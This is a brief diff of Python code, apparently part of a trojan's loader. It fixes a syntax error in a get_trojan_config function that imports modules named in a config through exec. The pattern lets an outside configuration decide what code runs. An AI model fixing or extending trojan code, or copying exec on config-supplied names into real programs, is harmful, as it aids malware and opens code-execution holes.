@@ -1,3 +1,4 @@
+#-*- coding: utf-8 -*-
 import json
 import base64
 import sys
@@ -48,7 +49,7 @@ def get_trojan_config():
 
 	for task in config:
 		if task['module'] not in sys.modules:
-			exec("import %s" $ task['module'])
+			exec("import %s" % task['module'])
 
 	return config
 
